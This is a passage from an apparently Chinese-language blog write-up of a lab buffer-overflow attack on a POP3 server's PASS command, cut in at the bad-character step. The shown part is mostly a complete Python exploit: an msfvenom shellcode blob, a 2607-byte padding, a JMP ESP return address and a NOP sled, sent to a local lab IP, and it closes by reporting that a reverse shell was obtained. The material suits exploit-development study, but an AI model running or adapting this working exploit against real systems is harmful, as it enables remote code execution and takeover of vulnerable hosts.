class="number">4</span>+badchar</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e</span><br></pre></td></tr></table></figure>

<p><strong>2、在 Immunity Debugger 观察发现存在 \x00  \x0a  \x0d  三个坏字符</strong></p>




<h3 id="Step-8-构造shellcode并利用"><a href="#Step-8-构造shellcode并利用" class="headerlink" title="Step 8. 构造shellcode并利用"></a><strong><em>Step 8. 构造shellcode并利用</em></strong></h3><p><strong><em>思路：</em></strong></p>
<p><strong>利用msfvenom生成shellcode</strong></p>
<p><strong>实操记录：</strong></p>
<p><strong>（1）查询合适payload：</strong></p>


<p><strong>（2） 生成shellcode：  使用-b去除坏字符、 -f 定义输出格式、EXITFUN=thread   稳定会话</strong></p>


<p><em>（3）构造并发送: 加上8个 \x90  ，是防止跳转后覆盖shellcode</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line"><span class="string">&quot;\xbe\x1d\x97\x35\xb0\xd9\xf7\xd9\x74\x24\xf4\x5d\x33\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\x31\x75\x12\x03\x75\x12\x83\xd8\x93\xd7\x45\x1e\x73\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\xde\x84\xfa\x2f\x3b\xb5\x3a\x4b\x48\xe6\x8a\x1f\x1c\x0b&quot;</span></span><br><span class="line"><span class="string">&quot;\x60\x4d\xb4\x98\x04\x5a\xbb\x29\xa2\xbc\xf2\xaa\x9f\xfd\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\x28\xe2\xd1\x75\x10\x2d\x24\x74\x55\x50\xc5\x24\x0e\x1e\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xd8\x3b\x6a\x41\x53\x77\x7a\xc1\x80\xc0\x7d\xe0\x17\x5a\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x22\x96\x8f\x5c\x6b\x80\xcc\x59\x25\x3b\x26\x15\xb4\xed\x76&quot;</span></span><br><span class="line"><span class="string">&quot;\xd6\x1b\xd0\xb6\x25\x65\x15\x70\xd6\x10\x6f\x82\x6b\x23\xb4&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xb7\xa6\x2e\x5a\x33\x10\x8a\x5a\x90\xc7\x59\x50\x5d\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\x05\x75\x60\x40\x3e\x81\xe9\x67\x90\x03\xa9\x43\x34\x4f\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\xed\x6d\x35\xdc\x12\x6d\x96\x81\xb6\xe6\x3b\xd5\xca\xa5\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x1a\xe7\x55\xa4\x34\x70\x26\x96\x9b\x2a\xa0\x9a\x54\xf5\x37&quot;</span></span><br><span class="line"><span class="string">&quot;\xdc\x4e\x41\xa7\x23\x71\xb2\xee\xe7\x25\xe2\x98\xce\x45\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\xee\x93\x3e\x08\x40\x4c\xff\xf8\x20\x3c\x97\x12\xaf\x63&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\x1d\x65\x0c\x22\xe4\xee\xf3\x1b\x53\x67\x9b\x59\x9b\x6d&quot;</span></span><br><span class="line"><span class="string">&quot;\xef\xd7\x7d\xe7\x1f\xbe\xd6\x90\x86\x9b\xac\x01\x46\x36\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x02\xcc\xb5\x2e\xcc\x25\xb3\x3c\xb9\xc5\x8e\x1e\x6c\xd9\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x36\xf2\x48\xa3\xc6\x7d\x71\x7c\x91\x2a\x47\x75\x77\xc7\xfe&quot;</span></span><br><span class="line"><span class="string">&quot;\x2f\x65\x1a\x66\x17\x2d\xc1\x5b\x96\xac\x84\xe0\xbc\xbe\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\xf8\xea\x0c\xbf\x56\x44\xeb\x69\x19\x3e\xa5\xc6\xf3\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x25\xc4\xa0\x3c\x60\xb2\x4c\x8c\xdd\x83\x73\x21\x8a\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x5f\x2a\xeb\xc7\xdb\x5a\xa6\x45\x4d\xf3\x6f\x1c\xcf\x9e&quot;</span></span><br><span class="line"><span class="string">&quot;\x8f\xcb\x0c\xa7\x13\xf9\xec\x5c\x0b\x88\xe9\x19\x8b\x61\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x32\x7e\x85\x37\x32\xab&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#buffer = &quot;A&quot;*2607 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;\x90&quot;*8 + shellcode</span></span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2607</span> + <span class="string">&quot;\xe3\x41\x4b\x5f&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span> + shellcode</span><br><span class="line">	</span><br><span class="line"><span class="keyword">try</span>:	</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Fuzzing PASS with %s bytes&quot;</span> %<span class="built_in">len</span>(buffer)</span><br><span class="line">	s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)</span><br><span class="line">	s.connect((<span class="string">&#x27;192.168.181.129&#x27;</span> , <span class="number">110</span>))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;USER LWW&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;PASS&#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.send(<span class="string">&#x27;QUIT&#x27;</span>+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">	s.close()</span><br><span class="line">		</span><br><span class="line"><span class="keyword">except</span>  Exception,e:</span><br><span class="line">	<span class="built_in">print</span> e	</span><br></pre></td></tr></table></figure>

<p><strong>（4）本地监听，成功反弹shell</strong></p>

            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title='0' data-url='http://music.163.com/song/media/outer/url?id=29577193'></li>
                        
                    
                        
                            <li title='1' data-url='http://music.163.com/song/media/outer/url?id=28445545'></li>
                        
                    
                        
                            <li title='2' data-url='http://music.163.com/song/media/outer/url?id=1072983'></li>
                        
                    
                        
                            <li title='3' data-url='http://music.163.com/song/media/outer/url?id=41630480'></li>
                        
                    
                        
                            <li title='4' data-url='http://music.163.com/song/media/outer/url?id=29577189'></li>
                        
                    
                        
                            <li title='5' data-url='http://music.163.com/song/media/outer/url?id=19563212'></li>
                        
                    
                        
                            <li title='6' data-url='http://music.163.com/song/media/outer/url?id=498661'></li>
                        
                    
                </ul>
            
        </div>
        
    <div id='gitalk-container' class="comment link"
		data-enable='false'
        data-ae='false'
        data-ci=''
        data-cs=''
        data-r=''
        data-o=''
        data-a=''
        data-d='false'
    >查看评论</div>


    </div>
    
        <div class='side'>
			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">0x00实验环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x01实验思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">0x02实验记录：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-%E5%88%A9%E7%94%A8python%E8%84%9A%E6%9C%AC%E6%B5%8B%E8%AF%95%E8%BF%9E%E6%8E%A5windows%E7%9A%84POP3"><span class="toc-number">3.1.</span> <span class="toc-text">Step1.利用python脚本测试连接windows的POP3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-2-%E7%A1%AE%E5%AE%9A%E6%98%AF%E5%90%A6%E4%BC%9A%E6%BA%A2%E5%87%BA%E5%8F%8A%E5%88%9D%E6%AD%A5EIP%E5%AE%9A%E4%BD%8D"><span class="toc-number">3.2.</span> <span class="toc-text">Step 2. 确定是否会溢出及初步EIP定位</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-3-%E7%A1%AE%E5%AE%9AEIP%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">3.3.</span> <span class="toc-text">Step 3. 确定EIP的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-4-%E5%88%A4%E6%96%ADESP%E5%AD%98%E6%94%BE%E6%95%B0%E6%8D%AE%E9%95%BF%E5%BA%A6"><span class="toc-number">3.4.</span> <span class="toc-text">Step 4 .判断ESP存放数据长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-5-%E5%AF%BB%E6%89%BEJMP-ESP"><span class="toc-number">3.5.</span> <span class="toc-text">Step 5.寻找JMP ESP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-6-%E6%B5%8B%E8%AF%95%E8%B7%B3%E8%BD%AC"><span class="toc-number">3.6.</span> <span class="toc-text">Step 6. 测试跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-7-%E5%AF%BB%E6%89%BE%E5%9D%8F%E5%AD%97%E7%AC%A6"><span class="toc-number">3.7.</span> <span class="toc-text">Step 7. 寻找坏字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step-8-%E6%9E%84%E9%80%A0shellcode%E5%B9%B6%E5%88%A9%E7%94%A8"><span class="toc-number">3.8.</span> <span class="toc-text">Step 8. 构造shellcode并利用</span></a></li></ol></li></ol>	
        </div>
    
</div>


    </div>
</div>
</body>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
                        <div class="pswp__preloader__donut"></div>
                      </div>
                    </div>
                </div>
            </div>
            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div> 
            </div>
            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
